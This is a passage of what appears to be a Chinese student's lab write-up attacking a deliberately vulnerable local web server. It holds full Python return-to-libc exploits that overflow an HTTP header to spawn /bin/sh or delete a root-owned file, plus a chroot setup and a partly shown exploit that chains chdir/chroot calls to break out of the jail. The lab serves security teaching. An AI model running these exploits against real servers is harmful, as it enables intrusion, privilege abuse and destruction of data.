class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python  </span></span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line"><span class="keyword">import</span> traceback  </span><br><span class="line"><span class="keyword">import</span> struct  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line"><span class="keyword">import</span> os.path  </span><br><span class="line"><span class="keyword">import</span> binascii  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># libc基地址  </span></span><br><span class="line"><span class="comment"># ASLR应关闭，以便libc的基地址在下次重启之前不会改变   </span></span><br><span class="line"><span class="comment"># 您可以使用&quot;ldd ./program&quot;来检查libc基地址  </span></span><br><span class="line">base_addr = <span class="number">0xf7d9d000</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># libc内部函数（字符串）的所有偏移量变化不大（有时会变化，需要预先检查）。  </span></span><br><span class="line"><span class="comment"># 要获取函数的偏移量，可以使用：  </span></span><br><span class="line"><span class="comment">##  readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; system&quot;  </span></span><br><span class="line"><span class="comment"># 获取&quot;/bin/sh&quot;：  </span></span><br><span class="line"><span class="comment">## ropper --file /lib/i386-linux-gnu/libc.so.6 --string &quot;/bin/sh&quot;  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># system  </span></span><br><span class="line">sys_addr = base_addr + <span class="number">0x00041780</span></span><br><span class="line"><span class="comment"># /bin/sh  </span></span><br><span class="line">sh_addr = base_addr + <span class="number">0x0018e363</span> </span><br><span class="line"><span class="comment"># exit  </span></span><br><span class="line">ex_addr = base_addr + <span class="number">0x000340c0</span> </span><br><span class="line"><span class="comment"># unlink  </span></span><br><span class="line">ul_addr = base_addr + <span class="number">0x000f4100</span></span><br><span class="line"><span class="comment"># dead  </span></span><br><span class="line">d_addr = <span class="number">0xdeadbeef</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># ebp 为了简化任务，我们打印getToken函数（漏洞）中的ebp   </span></span><br><span class="line">ebp_addr = <span class="number">0xffffd218</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">## 以下是您应该修改的函数，以构造一个  </span></span><br><span class="line"><span class="comment">## HTTP请求，该请求将在某些部分  </span></span><br><span class="line"><span class="comment">## 漏洞Web服务器中导致缓冲区溢出并利用它。  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_exploit</span>(<span class="params">shellcode, <span class="built_in">type</span></span>):  </span><br><span class="line">  </span><br><span class="line">    ul_arg = <span class="string">&quot;/tmp/test.txt\0&quot;</span>  </span><br><span class="line">    ul_arg_addr = ebp_addr + <span class="number">20</span>  </span><br><span class="line">  </span><br><span class="line">    sys_arg = <span class="string">&quot;/bin/sh\0&quot;</span>  </span><br><span class="line">    sys_arg_addr = ebp_addr + <span class="number">20</span>  </span><br><span class="line">  </span><br><span class="line">    req = (<span class="string">&quot;POST / HTTP/1.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    <span class="comment"># 除了&quot;Content-Length&quot;以外的所有头信息都不重要  </span></span><br><span class="line">    req += (<span class="string">&quot;Host: 127.0.0.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    <span class="comment"># 下面的Content-Length是有用的，取决于  </span></span><br><span class="line">    <span class="comment"># 用户名加密码的长度，您需要使用wireshark（与Web浏览器一起）  </span></span><br><span class="line">    <span class="comment"># 检查长度  </span></span><br><span class="line">    req += (<span class="string">&quot;Content-Length: 58\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)   </span><br><span class="line">    req += (<span class="string">&quot;Origin: http://127.0.0.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    req += (<span class="string">&quot;Connection: keep-alive\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    req += (<span class="string">&quot;Referer: http://127.0.0.1/\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">    req += (<span class="string">&quot;Hacking: &quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    <span class="comment"># 对于不同的操作系统（和编译），填充的长度  </span></span><br><span class="line">    <span class="comment"># 劫持栈中返回地址的长度可能不同，  </span></span><br><span class="line">    <span class="comment"># 因此您需要调试程序以检查和调整。  </span></span><br><span class="line">    req += <span class="string">b&#x27;A&#x27;</span> * <span class="number">1068</span></span><br><span class="line">    <span class="comment"># b&#x27;C&#x27; * 4  </span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 使用libc中的&quot;/bin/sh&quot;字符串  </span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">1</span>:  </span><br><span class="line">        req += p32(sys_addr)  </span><br><span class="line">        req += p32(ex_addr)  </span><br><span class="line">        req += p32(sh_addr)  </span><br><span class="line">        req += p32(<span class="number">0</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 将&quot;/bin/sh&quot;字符串放入栈中  </span></span><br><span class="line">    <span class="comment"># ebp用于定位字符串的位置   </span></span><br><span class="line">    <span class="comment"># 注意：使用此方法，您可以将任意字符串放入栈中，   </span></span><br><span class="line">    <span class="comment"># 以便&quot;system&quot;可以执行任意命令  </span></span><br><span class="line">    <span class="comment">#req += p32(sys_addr)  </span></span><br><span class="line">    <span class="comment">#req += p32(ex_addr)  </span></span><br><span class="line">    <span class="comment">#req += p32(sys_arg_addr)  </span></span><br><span class="line">    <span class="comment">#req += p32(0)  </span></span><br><span class="line">    <span class="comment">#req += sys_arg.encode(&#x27;latin-1&#x27;)  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 删除指定路径&quot;ul_arg&quot;的文件  </span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">2</span>:  </span><br><span class="line">        req += p32(ul_addr)  </span><br><span class="line">        req += p32(ex_addr)  </span><br><span class="line">        req += p32(ul_arg_addr)  </span><br><span class="line">        req += p32(<span class="number">0</span>)  </span><br><span class="line">        req += ul_arg.encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">      </span><br><span class="line">  </span><br><span class="line">    req += (<span class="string">&quot;\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    req += (<span class="string">&quot;\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">     </span><br><span class="line">    <span class="comment"># 以下是您可以通过Web浏览器注册到Web服务器的用户名/密码  </span></span><br><span class="line">    <span class="comment"># 这些信息将存储在后面的sqlite数据库中。  </span></span><br><span class="line">    <span class="comment"># 您需要根据自己的注册更改这些信息。  </span></span><br><span class="line">   </span><br><span class="line">    <span class="comment"># 请注意，成功的POST将由服务器以提示页面响应。  </span></span><br><span class="line">    <span class="comment"># 通过使用成功的响应，您可以判断服务器是否已  </span></span><br><span class="line">    <span class="comment"># 崩溃（通过利用），以便您可以相应地调整填充。  </span></span><br><span class="line">    req += (<span class="string">&quot;login_username=lixiang&amp;login_password=123456&amp;submit_login=Login&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(req)  </span><br><span class="line">    <span class="keyword">return</span> req  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">#如果您无法使用p32（在pwnlib中），可以使用以下行  </span></span><br><span class="line">    <span class="comment">#req += (addr1).to_bytes(4, byteorder=&#x27;little&#x27;)  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_req</span>(<span class="params">host, port, req</span>):  </span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connecting to %s:%d...&quot;</span> % (host, port))  </span><br><span class="line">    sock.connect((host, port))  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connected, sending request...&quot;</span>)  </span><br><span class="line">    sock.send(req)  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Request sent, waiting for reply...&quot;</span>)  </span><br><span class="line">    rbuf = sock.recv(<span class="number">1024</span>)  </span><br><span class="line">    resp = (<span class="string">&quot;&quot;</span>).encode(<span class="string">&quot;latin-1&quot;</span>)  </span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(rbuf):  </span><br><span class="line">      resp = resp+rbuf  </span><br><span class="line">      rbuf = sock.recv(<span class="number">1024</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Received reply.&quot;</span>)  </span><br><span class="line">    sock.close()  </span><br><span class="line">    <span class="keyword">return</span> resp  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; type&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;type: 1 for shell, 2 for unlink&quot;</span>)  </span><br><span class="line">    exit()  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">try</span>:  </span><br><span class="line">    shellcode = <span class="string">&quot;&quot;</span>  </span><br><span class="line">    req = build_exploit(shellcode, <span class="built_in">int</span>(sys.argv[<span class="number">1</span>]))  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HTTP request:&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(req)  </span><br><span class="line">  </span><br><span class="line">    resp = send_req(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">80</span>, req)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HTTP response:&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(resp)  </span><br><span class="line"><span class="keyword">except</span>:  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Exception:&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(traceback.format_exc())  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="遇到的问题">遇到的问题</h3><ol type="1"><li><p>当服务器进程结束并重启时，常常会发生套接字绑定失败，因为端口80被占用。端口80是Apache服务器的默认端口，因此可以通过将Apache的默认端口修改为8080来解决此问题。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo su  </span><br><span class="line">systemctl disable apache2  </span><br><span class="line">vim /etc/apache2/ports.conf  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将Listen 80...更改为：Listen 8080</span></span><br><span class="line">vim /etc/apache2/sites-available/000-default.conf  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将&lt;VirtualHost *:80&gt;...更改为：&lt;VirtualHost *:8080&gt;</span></span><br><span class="line">systemctl restart apache2  </span><br></pre></td></tr></table></figure></li></ol><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619105721675.png"alt="修改Apache服务监听端口成功时的图像" /><figcaptionaria-hidden="true">修改Apache服务监听端口成功时的图像</figcaption></figure><ol start="2" type="1"><li><p>我发现通过setuid和sudo以这两种不同方式执行touchstone时，ebp值发生了变化。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./touchstone</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619162514457.png"alt="image-20240619162514457" /><figcaption aria-hidden="true">image-20240619162514457</figcaption></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./touchstone</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619162549093.png"alt="image-20240619162549093" /><figcaption aria-hidden="true">image-20240619162549093</figcaption></figure><p>AI回答：<code>setuid</code>和<code>sudo</code>提供了不同的权限提升机制。<code>setuid</code>通过设置可执行文件的权限，以文件所有者的权限运行可执行文件，而<code>sudo</code>允许授权用户临时提升权限以执行特定命令。<code>ebp</code>值的变化可能是由于不同的执行环境和安全机制造成的，尤其是在涉及权限提升时。</p></li></ol><h2id="使用chroot约束web服务器执行攻击删除根权限文件tmptest">使用chroot约束Web服务器，执行攻击，删除根权限文件/tmp/test</h2><h3 id="实验环境配置-1">实验环境配置</h3><p>为了避免影响之前实验的结果，将代码目录复制到code_chroot。当然，仍然需要禁用地址随机化以避免地址变化。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r ./code ./code_chroot</span><br></pre></td></tr></table></figure><h3 id="执行chroot配置">执行chroot配置</h3><p>在server.c中添加以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">chroot</span>(<span class="string">&quot;/jail&quot;</span>) == <span class="number">0</span>)  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chroot success\n&quot;</span>);  </span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619132459140.png"alt="image-20240619132459140" /><figcaption aria-hidden="true">image-20240619132459140</figcaption></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">make  </span><br><span class="line">sudo ./chroot-setup.sh  </span><br><span class="line">cd /jail  </span><br><span class="line">sudo ./touchstone  </span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619132644219.png"alt="image-20240619132644219" /><figcaption aria-hidden="true">image-20240619132644219</figcaption></figure><h3 id="执行攻击测试">执行攻击测试</h3><p>创建测试文件然后启动服务器，发现成功打印了”chroot success”信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在tmp目录中创建测试文件</span>  </span><br><span class="line">sudo touch /tmp/test.txt</span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在/jail/tmp目录中创建测试文件</span></span><br><span class="line">sudo touch /jail/tmp/test.txt</span><br><span class="line">sudo chown root /jail/tmp/test.txt  </span><br><span class="line">ll /jail/tmp/test.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在/jail目录中启动服务器</span></span><br><span class="line">./touchstone</span><br></pre></td></tr></table></figure><figure><imgsrc="https://picx.zhimg.com/80/v2-9a3d6da5f1d453d9edec1ee0bfbebcf2_720w.png"alt="image-20240619135337160" /><figcaption aria-hidden="true">image-20240619135337160</figcaption></figure><p>服务器进程的地址信息可能会发生变化，使用gdb重新检查（注意这里使用ldd是错误的，虽然它显示与之前相同，但需要使用gdb动态附加以查看地址）。</p><p>手册中的提示：监狱中的库是独立的，位于<code>/jail/lib</code>下（与原路径不同），因此需要重新查找libc基地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep banksv</span><br><span class="line">sudo gdb -q -p &lt;PID&gt;</span><br><span class="line">info proc map</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619133412947.png"alt="image-20240619133412947" /><figcaption aria-hidden="true">image-20240619133412947</figcaption></figure><figure><imgsrc="https://pic1.zhimg.com/80/v2-4373262ae41bde082db5e2dc19fefb11_720w.png"alt="image-20240619133327610" /><figcaption aria-hidden="true">image-20240619133327610</figcaption></figure><p>将脚本中的<code>base_addr</code>修改为<code>exploit_2.py</code>，然后执行删除文件功能。发现<code>\tmp\text.txt</code>未成功删除，但<code>\jail\tmp\text.txt</code>被删除。使用<code>dmesg</code>检查内核调试信息，未发现<code>segmentfault</code>，表明<code>chroot</code>有效，监狱目录外的测试文件未被删除。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619152219338.png"alt="image-20240619152219338" /><figcaption aria-hidden="true">image-20240619152219338</figcaption></figure><h3 id="删除tmptest.txt文件">删除/tmp/test.txt文件</h3><figure><imgsrc="C:\Users\11946\AppData\Roaming\Typora\typora-user-images\image-20240621163129108.png"alt="image-20240621163129108" /><figcaption aria-hidden="true">image-20240621163129108</figcaption></figure><p>然后尝试删除<code>/tmp/test.txt</code>文件。这需要使用chroot和chdir相关调用来实现，因此首先需要找到相关地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot;chroot&quot;  </span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot;chdir&quot; </span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621152017101.png"alt="image-20240621152017101" /><figcaption aria-hidden="true">image-20240621152017101</figcaption></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d banksv</span><br></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621152216367.png"alt="image-20240621152216367" /><figcaption aria-hidden="true">image-20240621152216367</figcaption></figure><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc基地址</span></span><br><span class="line"><span class="comment"># ASLR应关闭，以便libc的基地址在下次重启之前不会改变 </span></span><br><span class="line"><span class="comment"># 您可以使用&quot;ldd ./program&quot;来检查libc基地址</span></span><br><span class="line">base_addr = <span class="number">0xf7db2000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc内部函数（字符串）的所有偏移量变化不大（有时会变化，需要预先检查）.</span></span><br><span class="line"><span class="comment"># 要获取函数的偏移量，可以使用:</span></span><br><span class="line"><span class="comment">##  readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; system&quot;</span></span><br><span class="line"><span class="comment"># 获取&quot;/bin/sh&quot;:</span></span><br><span class="line"><span class="comment">## ropper --file /lib/i386-linux-gnu/libc.so.6 --string &quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system</span></span><br><span class="line">sys_addr = base_addr + <span class="number">0x00041780</span> </span><br><span class="line"><span class="comment"># /bin/sh</span></span><br><span class="line">sh_addr  = base_addr + <span class="number">0x0018e363</span></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">ex_addr  = base_addr + <span class="number">0x000340c0</span></span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">ul_addr  = base_addr + <span class="number">0x000f4100</span></span><br><span class="line"><span class="comment"># chroot</span></span><br><span class="line">chr_addr = base_addr + <span class="number">0x000fce60</span></span><br><span class="line"><span class="comment">#chdir</span></span><br><span class="line">chd_addr = base_addr + <span class="number">0x000f2c70</span></span><br><span class="line"><span class="comment"># pop-ret</span></span><br><span class="line">pop_addr = <span class="number">0x080d19a4</span></span><br><span class="line"><span class="comment"># dead</span></span><br><span class="line">d_addr   = <span class="number">0xdeadbeef</span></span><br><span class="line"><span class="comment"># ebp  为了简化任务，我们打印getToken函数（漏洞）中的ebp </span></span><br><span class="line">ebp_addr = <span class="number">0xffffd218</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 以下是您应该修改的函数，以构造一个</span></span><br><span class="line"><span class="comment">## HTTP请求，该请求将在某些部分</span></span><br><span class="line"><span class="comment">## 漏洞Web服务器中导致缓冲区溢出并利用它。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_exploit</span>(<span class="params">shellcode</span>):</span><br><span class="line">    shift_val = <span class="number">19</span> * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    chd_arg = <span class="string">&quot;..\0\0&quot;</span></span><br><span class="line">    chd_arg_addr =  ebp_addr + shift_val</span><br><span class="line"></span><br><span class="line">    chr_arg2 = <span class="string">&quot;server\0\0&quot;</span></span><br><span class="line">    chr_arg2_addr = ebp_addr + shift_val + <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    chr_arg = <span class="string">&quot;.\0\0\0&quot;</span></span><br><span class="line">    chr_arg_addr =  ebp_addr + shift_val + <span class="number">12</span></span><br><span class="line"></span><br><span class="line">    ul_arg = <span class="string">&quot;/tmp/test.txt\0&quot;</span></span><br><span class="line">    ul_arg_addr =   ebp_addr + shift_val + <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    sys_arg = <span class="string">&quot;/bin/sh\0&quot;</span></span><br><span class="line">    sys_arg_addr =  ebp_addr + <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    req = (<span class="string">&quot;POST / HTTP/1.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># 除了&quot;Content-Length&quot;以外的所有头信息都不重要</span></span><br><span class="line">    req += (<span class="string">&quot;Host: 